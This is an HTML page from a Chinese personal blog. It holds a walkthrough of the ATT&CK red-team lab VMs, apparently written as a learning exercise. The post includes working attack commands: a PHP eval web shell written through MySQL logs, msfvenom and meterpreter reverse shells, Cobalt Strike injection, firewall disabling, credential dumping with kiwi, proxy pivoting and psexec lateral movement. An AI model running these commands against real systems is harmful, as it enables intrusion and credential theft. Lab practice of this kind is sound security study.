@@ -1,0 +1,500 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>ATT&amp;CK红队评估 | 嘉然今天学什么</title>
+        <meta name="author" content="fc235" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/images/avatar.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.47/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.3.0/css/all.min.css" />
+<link rel="stylesheet" href="/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <nav id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <div class="desktop-menu">
+        <a class="title" href="/">
+            <span>嘉然今天学什么</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" @click="shouMenuItems = !shouMenuItems" v-show="shouMenuItems"></div>
+        <div class="title" @click="shouMenuItems = !shouMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;嘉然今天学什么</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="shouMenuItems">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <div class="article">
+    <div>
+        <h1>ATT&amp;CK红队评估</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/8
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CyberSecurity-Learning/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CyberSecurity Learning
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" style="color: #03a9f4">靶场实战</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="01-ATT-amp-CK红队评估"><a href="#01-ATT-amp-CK红队评估" class="headerlink" title="01 ATT&amp;CK红队评估"></a>01 ATT&amp;CK红队评估</h2><h3 id="0x01环境搭建"><a href="#0x01环境搭建" class="headerlink" title="0x01环境搭建"></a>0x01环境搭建</h3><h4 id="环境搭建测试"><a href="#环境搭建测试" class="headerlink" title="环境搭建测试"></a>环境搭建测试</h4><p>配置好网卡：这些用vmnet2(仅主机)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304181544836.png" alt="image-20230418154419806"></p>
+<p>这些用vmnet1(仅主机)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304181545011.png" alt="image-20230418154503977"></p>
+<p>构成这样一个拓扑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304181549350.png" alt="image-20230418154905308"></p>
+<p>kali作为攻击机</p>
+<p>之后启动win7的phpstudy，这里我启动失败了，所以需要手动开启apache2和sql</p>
+<p>cmd在<code>C:\phpStudy\Apache\bin</code>目录下输入</p>
+<pre><code class="shell">httpd.exe -k install
+httpd.exe -k -n apache2.4
+</code></pre>
+<p>然后在<code>services.msc</code>中启动apache2.4</p>
+<p>在<code>C:\phpStudy\MySQL\bin</code>目录下输入</p>
+<pre><code class="shell">mysqld --defaults-file=&quot;C:/phpStudy/mysql/my.ini&quot; --console --skip-grant-tables
+</code></pre>
+<p>启动mysql</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>查看kaili本地ip地址</p>
+<h5 id="通过nmap扫描局域网存活主机"><a href="#通过nmap扫描局域网存活主机" class="headerlink" title="通过nmap扫描局域网存活主机"></a>通过nmap扫描局域网存活主机</h5><pre><code class="shell">nmap -sn 192.168.220.0/24
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304181557403.png" alt="image-20230418155714369"></p>
+<p>扫描出来win7的ip地址为192.168.220.128(后来调整环境变为129)</p>
+<p>然后扫端口</p>
+<pre><code class="shell">nmap 192.168.220.129
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182032961.png" alt="image-20230418203258929"></p>
+<p>开放了80端口，访问之后发现是phpstudy探针</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182045005.png" alt="image-20230418204535934"></p>
+<h5 id="扫一下目录"><a href="#扫一下目录" class="headerlink" title="扫一下目录"></a>扫一下目录</h5><pre><code class="shell">dirsearch -u 192.168.220.129
+</code></pre>
+<p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/image-20230418204654394.png" alt="image-20230418204654394"></p>
+<p>除去403的部分，剩下的有这些，进入phpmyadmin尝试弱密码admin-admin居然就进了。</p>
+<p>跟朋友交流时，他说他用的dirmap扫出来了&#x2F;beifen.rar这个文件，但我虚拟机换网络怕环境又出问题，就没去试，得到beifen.rar，看起来是一个备份文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182139175.png" alt="image-20230418213955144">尝试访问发现yxcms</p>
+<p>继续查看备份文件，发现该目录下有数据库密码，居然是root-root</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182212316.png" alt="image-20230418221132709"></p>
+<p>另外还找到了cms的默认登录密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182214219.png" alt="image-20230418221447191"></p>
+<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><h4 id="漏洞搜索与利用"><a href="#漏洞搜索与利用" class="headerlink" title="漏洞搜索与利用"></a>漏洞搜索与利用</h4><h5 id="sql写马"><a href="#sql写马" class="headerlink" title="sql写马"></a>sql写马</h5><p>这里使用admin-admin进去了phpmyadmin的后台</p>
+<p>搜索</p>
+<pre><code class="sql">SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;
+</code></pre>
+<p>发现结果是<img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182120758.png" alt="image-20230418212013720"></p>
+<p>所以不能直接写入木马，只能用日志了</p>
+<pre><code class="sql">SET GLOBAL general_log=ON
+SET GLOBAL general_log_file=&#39;C:\\phpStudy\\WWW\\shell.php&#39; # 这里可以在\\和/中切换尝试
+</code></pre>
+<p>路径可以从phpinfo或者php探针里看到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182136688.png" alt="image-20230418213610656"><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182136751.png" alt="image-20230418213620726"></p>
+<p>然后就可以写马了，</p>
+<pre><code class="php">SELECT &#39;&lt;?php eval($_POST[ant]);?&gt;&#39;
+</code></pre>
+<p>然后蚁剑连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182241051.png" alt="image-20230418224101006"></p>
+<p>然后在留言本这里还有存储型xss漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304191540930.png" alt="image-20230419154017866"></p>
+<h4 id="后台getshell上传"><a href="#后台getshell上传" class="headerlink" title="后台getshell上传"></a>后台getshell上传</h4><p>登入后台后，在前台模板的地方有创建php模板的地方，可以直接写入木马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182301095.png" alt="image-20230418230152054"></p>
+<p>路径这里在备份文件中随便搜索一个模板就能找到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182307168.png" alt="image-20230418230717107"></p>
+<p>找到路径直接连接就行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304182308862.png" alt="image-20230418230819829"></p>
+<h4 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h4><h5 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h5><p>拿到shell了首先尝试提权，这里使用msf生成木马</p>
+<pre><code class="zsh">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.220.128 lport=8888 -f exe -o shell.exe
+</code></pre>
+<p>生成的shell.exe通过蚁剑上传到win7，然后在msf中开启监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304191638164.png" alt="image-20230419163819112"></p>
+<blockquote>
+<p>它给我比心了，它喜欢我</p>
+</blockquote>
+<pre><code class="msf">use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.220.128
+set LPORT 8888
+//show options
+run
+</code></pre>
+<p>这里的lhost都是kali的ip，反代的监听host，然后就能发现已经升到SYSTEM权限了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304191738928.png" alt="image-20230419173849881"></p>
+<p>如果没有可以尝试使用<code>getsystem</code>命令</p>
+<p>维持会话稳定性可以考虑迁移shell到其他不容易被关闭的进程上</p>
+<pre><code class="shell">shell #进入Windows的shell
+tasklist | findstr explorer.exe #查询explorer的pid
+ctrl+c #退出shell
+migrate 3000 #这里我的进程号是3000
+</code></pre>
+<h5 id="联动Cobalt-Strike"><a href="#联动Cobalt-Strike" class="headerlink" title="联动Cobalt Strike"></a>联动Cobalt Strike</h5><p>或者可以将meterpreter的shell派生到<a target="_blank" rel="noopener" href="https://www.123pan.com/s/ulbbVv-pni63.html?SharePwd=dV01">Cobalt Strike</a>上</p>
+<p>打开CS能看到有客户端和服务端，先开服务端，用</p>
+<pre><code class="shell"># bash teamserver ip password
+bash teamserver 192.168.220.128 123456
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304231755126.png" alt="image-20230423175503070"></p>
+<p>然后去开启客户端</p>
+<pre><code class="shell"># Windows下双击cobaltstrike-client.cmd，kali直接把cmd改为sh
+bash cobaltstrike-client.sh
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304231759346.png" alt="image-20230423175917317"></p>
+<p>密码就服务端的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304232012036.png" alt="image-20230423201215987"></p>
+<p>创建一个listener，类似handler</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304232102615.png" alt="image-20230423210257575"></p>
+<p>修改一下端口，然后save，之后去msf的meterpreter中</p>
+<pre><code class="msf">background
+use exploit/windows/local/payload_inject
+set payload windows/meterpreter/reverse_http
+set lhost 192.168.220.128 # HTTP Host(Stager)
+set lport 7777 # HTTP Port(C2)
+set session 1
+set DisablePayloadHandler true
+run
+</code></pre>
+<p>然后在CS中就能看到shell了，设置一下回显时间</p>
+<pre><code class="shell">beacon&gt; sleep 1
+</code></pre>
+<p>CS的shell执行Windows命令时只要在命令前加shell就好</p>
+<h5 id="CS制作木马反弹shell"><a href="#CS制作木马反弹shell" class="headerlink" title="CS制作木马反弹shell"></a>CS制作木马反弹shell</h5><p>添加一个beacon的listener</p>
+<p>制作木马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304232259720.png" alt="image-20230423225934537"></p>
+<p>生成的exe蚁剑上传并执行，cs这就能拿到shell了</p>
+<h5 id="cs提权"><a href="#cs提权" class="headerlink" title="cs提权"></a>cs提权</h5><p>选择Elevate</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304232308030.png" alt="image-20230423230831989"></p>
+<p>加一个监听，然后就能自动提权了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304232310102.png" alt="image-20230423231053061"></p>
+<h5 id="开启rdp"><a href="#开启rdp" class="headerlink" title="开启rdp"></a>开启rdp</h5><pre><code class="shell">run post/windows/manage/enable_rdp
+</code></pre>
+<p>执行结束会生成一个文件，可以用来关闭远程桌面</p>
+<pre><code class="shell">run multi_console_command -r /root/.msf4/loot/20230419174236_default_192.168.220.129_host.windows.cle_172907.txt
+</code></pre>
+<p>然后就可以开始信息收集了</p>
+<pre><code class="shell">systeminfo #查看相关补丁安装情况，系统详细信息
+ipconfig /all #查看本机ip，所在域，可以看到另一张网卡的ip 我这里是192.168.52.143
+net view /domain #查看存在域,GOD
+net time /domain #判断存在域,owa.god.org
+wmic useraccount get /all #获取域相关用户信息
+net group /domain #查看组账户
+net group &quot;domain controllers&quot; /domain #查看域控，这里是OWA$
+</code></pre>
+<h4 id="主机密码收集"><a href="#主机密码收集" class="headerlink" title="主机密码收集"></a>主机密码收集</h4><p>然后使用kiwi爆破密码</p>
+<pre><code class="shell">load kiwi
+creds all
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304192035032.png" alt="image-20230419203550996"></p>
+<p>然后可以得到密码 hongrisec@2019</p>
+<h3 id="0x03-内网搜集"><a href="#0x03-内网搜集" class="headerlink" title="0x03 内网搜集"></a>0x03 内网搜集</h3><h4 id="继续信息收集"><a href="#继续信息收集" class="headerlink" title="继续信息收集"></a>继续信息收集</h4><p>之后尝试</p>
+<pre><code class="shell">ping owa.god.org
+</code></pre>
+<p>拿到域控ip：192.168.52.138，然后用一个简单的脚本去扫内网存活主机</p>
+<pre><code class="shell">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;
+</code></pre>
+<p>从 1 开始，以步长 1 遍历到 254。发送一个 ICMP echo 请求（即 ping），等待 1 秒钟后超时，如果主机没有响应则不会输出任何信息。由于 @ 符号，表示命令行不会显示当前命令的执行结果。若查找到包含 “TTL&#x3D;” 字符串的行，说明主机是存活的，输出该行信息，否则不输出任何信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304192116428.png" alt="image-20230419211607378"></p>
+<p>或者可以使用</p>
+<pre><code class="bash">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24
+
+use auxiliary/scanner/discovery/udp_sweep
+set rhosts 192.168.52.0/24
+</code></pre>
+<p>找出来了三个存活ip，然后就可以写出ip表</p>
+<pre><code class="iptables">192.168.52.138 #域控 2008
+192.168.52.143 #web网关服务器 win7
+192.168.52.141 #域成员 2K3
+</code></pre>
+<h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><pre><code class="meterpreter">shell
+netsh advfirewall set allprofiles state off
+</code></pre>
+<h5 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h5><p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304241000426.png" alt="image-20230424100031373"></p>
+<p>暴露端口果然多了</p>
+<h3 id="0x04-横向移动"><a href="#0x04-横向移动" class="headerlink" title="0x04 横向移动"></a>0x04 横向移动</h3><h4 id="msf-proxychain"><a href="#msf-proxychain" class="headerlink" title="msf+proxychain"></a>msf+proxychain</h4><p>搭建socks隧道，进入session，自动创建路由</p>
+<pre><code class="meterpreter">run post/multi/manage/autoroute
+run autoroute -p # 查看路由
+bg
+</code></pre>
+<p>然后退回msf</p>
+<pre><code class="msf">use auxiliary/server/socks_proxy
+show options # 查看选项，可选设置username，password
+set srvhost 127.0.0.1
+set version 4a
+
+jobs #查看任务是否成功执行
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304242112017.png" alt="image-20230424211220947"></p>
+<p>配置proxychains</p>
+<pre><code class="bash">vim /etc/proxychains4.conf
+</code></pre>
+<p>在proxylist下添加</p>
+<pre><code class="vim">socks4 127.0.0.1 1080
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305062233827.png" alt="image-20230506223347771"></p>
+<p>然后是全局代理测试</p>
+<pre><code class="bash">proxychains curl http://192.168.220.129/phpmyadmin
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304242125260.png" alt="image-20230424212554226"></p>
+<p>浏览器代理测试，这里用foxyproxy</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202304242126135.png" alt="image-20230424212658085"></p>
+<h4 id="frp巩固连接"><a href="#frp巩固连接" class="headerlink" title="frp巩固连接"></a>frp巩固连接</h4><p>配置<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a>，kali下载Linux版本，再下载Windows版本传入win7，kali配置<code>frps.ini</code>（如果有需要可以更改port和token），我就是默认的7000</p>
+<pre><code class="bash">./frps -c frps.ini
+</code></pre>
+<p>windows下配置<code>frpc.ini</code>，更改<code>server_addr</code>为kali的ip即可，其他按需更改，在shell中执行</p>
+<blockquote>
+<p>这里应该配置一个[socks_proxy]，但是由于客户端是Windows，22端口并不使用，所以我就用了默认的ssh配置，下面显示也是ssh</p>
+</blockquote>
+<pre><code class="shell">frpc.exe -c frpc.ini
+</code></pre>
+<p>kali中出现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305080013517.png" alt="image-20230508001336439"></p>
+<p>即为连接成功，然后去msf中设置代理</p>
+<pre><code class="msf">set Proxies socks5:127.0.0.1:6000
+set ReverseAllowProxy true
+</code></pre>
+<h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><p>msf内置信息搜索模块</p>
+<pre><code class="bash">auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
+auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
+auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
+auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(默认扫描1-10000)
+auxiliary/scanner/ftp/ftp_version            #发现内网ftp服务，基于默认21端口
+auxiliary/scanner/ssh/ssh_version            #发现内网ssh服务，基于默认22端口
+auxiliary/scanner/telnet/telnet_version      #发现内网telnet服务，基于默认23端口
+auxiliary/scanner/dns/dns_amp                #发现dns服务，基于默认53端口
+auxiliary/scanner/http/http_version          #发现内网http服务，基于默认80端口
+auxiliary/scanner/http/title                 #探测内网http服务的标题
+auxiliary/scanner/smb/smb_version            #发现内网smb服务，基于默认的445端口   
+auxiliary/scanner/mssql/mssql_schemadump     #发现内网SQLServer服务,基于默认的1433端口
+auxiliary/scanner/oracle/oracle_hashdump     #发现内网oracle服务,基于默认的1521端口 
+auxiliary/scanner/mysql/mysql_version        #发现内网mysql服务，基于默认3306端口
+auxiliary/scanner/rdp/rdp_scanner            #发现内网RDP服务，基于默认3389端口
+auxiliary/scanner/redis/redis_server         #发现内网Redis服务，基于默认6379端口
+auxiliary/scanner/db2/db2_version            #探测内网的db2服务，基于默认的50000端口
+auxiliary/scanner/netbios/nbname             #探测内网主机的netbios名字
+</code></pre>
+<p>nmap扫端口</p>
+<pre><code class="bash">proxychains nmap -Pn -sT 192.168.52.0/24
+</code></pre>
+<h4 id="控制域内主机"><a href="#控制域内主机" class="headerlink" title="控制域内主机"></a>控制域内主机</h4><p>由于知道密码，所以直接使用psexec</p>
+<pre><code class="msf">search psexec 
+use 4
+options
+</code></pre>
+<p>options配置可参考</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305080021301.png" alt="image-20230508002111235"></p>
+<p>lhost设置为win7内网网卡的ip，rhosts设置为要攻击的内网机器ip，然后执行即可拿到meterpreter</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305080028797.png" alt="image-20230508002836757"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202305080029673.png" alt="image-20230508002930636"></p>
+<p>这里有乱码，可以尝试更改编码来看</p>
+<pre><code class="shell">chcp 65001 #改为utf-8编码
+</code></pre>
+<p>后面操作也跟前面就差不多了，就写到这里了</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>第一次打这么复杂的靶场，参考了很多师傅的资料，自己也踩了很多坑，比如配置代理那边卡了我很久，还有一堆玄学问题，笔记排版可能也有些问题，但是也学会了很多。总结一下大致思路，收集已有信息，查找web网关上的漏洞，利用漏洞拿下网关，配置代理拿下内网。</p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2023 - 2023
+                    嘉然今天学什么
+                        <span id="footer-icon">
+                            <i class="fa-solid fa-font-awesome fa-fw"></i>
+                        </span>
+                        &commat;fc235
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+
+    </div>
+</footer>
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/js/main.js"></script>
+        
+        
+<script
+    src="https://giscus.app/client.js"
+    data-repo="fc235/comment"
+    data-repo-id="R_kgDOJW5fXA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOJW5fXM4CVyQR"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="1"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+        
+    </body>
+</html>
